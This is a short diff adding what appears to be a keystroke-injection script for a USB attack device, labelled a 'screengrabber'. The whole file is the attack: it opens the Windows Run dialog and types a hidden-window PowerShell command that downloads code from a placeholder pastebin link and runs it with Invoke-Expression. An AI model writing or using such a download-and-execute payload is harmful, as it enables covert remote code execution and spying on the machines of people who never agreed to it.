@@ -1,0 +1,5 @@
+REM screengrabber by u1bh4k3d
+GUI R
+DELAY 500
+STRING powershell -WindowStyle Hidden (New-Object System.Net.WebClient).DownloadString('PASTEBIN LINK') | Invoke-Expression
+ENTER
